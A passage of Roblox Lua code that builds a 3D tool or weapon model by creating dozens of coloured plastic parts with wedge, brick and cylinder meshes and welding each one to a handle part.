mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.172481537, -0.0945391655, 1.35411167, -1, 8.74227766e-008, 0, -8.74227766e-008, -1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0904999524, 0.485999972, 0.404999793))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.129356384, 1.25235367, 0.272830009, 1, -8.74227766e-008, 0, 0, 0, 1, -8.74227766e-008, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.129356384, 1.25235367, -0.203848839, -1, 8.74227766e-008, 0, 0, 0, 1, 8.74227766e-008, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.115564346, -1.31789017, -0.2256217, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.495871037))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.137985229, -1.3282423, 0.817209721, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.249999985, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.495871037))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.120735168, 1.24200726, 0.817209721, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.249999985, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.517430663))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -1.28339767, -0.848265171, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.187499985, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.495871037))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.137985229, 1.24200726, 0.817209721, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.249999985, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.517430663))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -1.36963272, 0.848265171, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.31249997, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.517430663))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, 1.19715977, 0.848265171, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.31249997, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.495871037))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.120735168, -1.3282423, 0.817209721, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.249999985, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -7.68573761, 0.28771162, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.0624999963, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -0.234244823, 8.07380676, -1, 0, 0, 0, -1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.187499985, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -0.28771162, -7.59949827, 0.999999881, 0, 0, 0, -0.99999994, 0, 0, 0, -0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.249999985, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -7.77197647, 0.234244823, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.43749997, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -2.09059143, 0.360152721, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.249999985, 0.31249997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -7.92375565, 0.21182394, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.43749997, 0.31249997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -7.60984039, 0.20319891, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.49999997, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -0.320485592, 7.77197647, -1, 0, 0, 0, -1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.0624999963, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -0.28771162, 7.92375565, -1, 0, 0, 0, -1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.124999993, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.9940033, -0.330836773, 0.0103435516, 0, 0, 1, 0, -1, 0, 1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 1, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, 1.93018341, 0.466011047, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.31249997, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, 1.82152367, 0.369420528, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.31249997, 0.31249997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.646788299, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.00204944611, -1.7887516, 0.0983161926, 0, 1, 0, 0, 0, -1, -1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.9375, 1, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.82152367, -0.240066051, -0.0103435516, 0, 0, 1, 0, 1, 0, -1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.31249997, 0.43749997, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.9940033, -0.336652279, -0.0103435516, 0, 0, 1, 0, 1, 0, -1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 1, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, 1.60592842, 0.186600685, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.31249997, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 1.81100714, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.00830316544, -2.37172699, 0.0862426758, 0, 1, 0, 0, 0, -1, -1, 0, 0))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 1, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0110378265, -0.329720974, 7.77231407, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.0624999963, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(2.02676964, -0.293530464, -0.0103435516, 0, 0, 1, 0, 1, 0, -1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.124999993, 0.74999994, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.646788299, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -1.7887516, 0.00204944611, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 1, 0.9375))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, 1.71459007, 0.260756493, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.31249997, 0.31249997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.646788299, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.00204944611, -1.7887516, 0.117282867, 0, -1, 0, 0, 0, -1, 1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.9375, 1, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.71459007, -0.186600685, -0.0103435516, 0, 0, 1, 0, 1, 0, -1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.31249997, 0.124999993, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.93018341, -0.28771162, 0.0103435516, 0, 0, 1, 0, -1, 0, 1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.31249997, 0.74999994, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, 1.71459007, 0.256663799, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.31249997, 0.31249997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, 1.60592842, 0.180776119, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.31249997, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(2.02676964, -0.28771162, 0.0103435516, 0, 0, 1, 0, -1, 0, 1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.124999993, 0.74999994, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.71459007, -0.180776119, 0.0103435516, 0, 0, 1, 0, -1, 0, 1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.31249997, 0.124999993, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.124181747, -0.100353718, 1.37481308, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.113124944, 0.607500017, 0.506249726))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -2.02676964, 0.466011047, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.124999993, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.115564346, 1.25235367, 0.272830009, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.124181747, -0.140022755, -1.20060539, -1, 0, 0, 0, 1, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.113124944, 0.354374975, 0.506249726))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.115564346, -1.31789017, -0.203848839, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.124181747, -0.158359051, -1.20060539, 1, 0, 0, 0, -1, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.113124944, 0.354374975, 0.506249726))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-1.28511906, -0.115564346, 0.236611366, 0, 0, -1, 1, 0, 0, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.15868187, -0.129035473, -1.21440411, 1, 0, 0, 0, -1, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0904999524, 0.283499986, 0.404999793))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.115564346, -1.31789017, 0.272830009, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -1.51969147, 0.170432568, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.31249997, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.388072997))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -1.28339767, -0.388392925, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.43749997, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0117478371, -0.15868187, -1.21440411, 0, 1, 0, 1, 0, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.405000001, 0.0904999897, 0.405000001))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.28511906, 0.120735168, 0.531545162, 0, 0, 1, -1, 0, 0, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.37499997, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -1.28339767, -0.585016251, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.81249994, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.00830316544, 0.127635956, -1.5731554, 0, -1, 0, -1, 0, 0, -0, -0, -1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -1.51969147, 0.174527168, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.31249997, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.517430663))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -1.28339767, -0.854077816, 1, 0, 0, 0, 0, -1, 0, 1, 0))
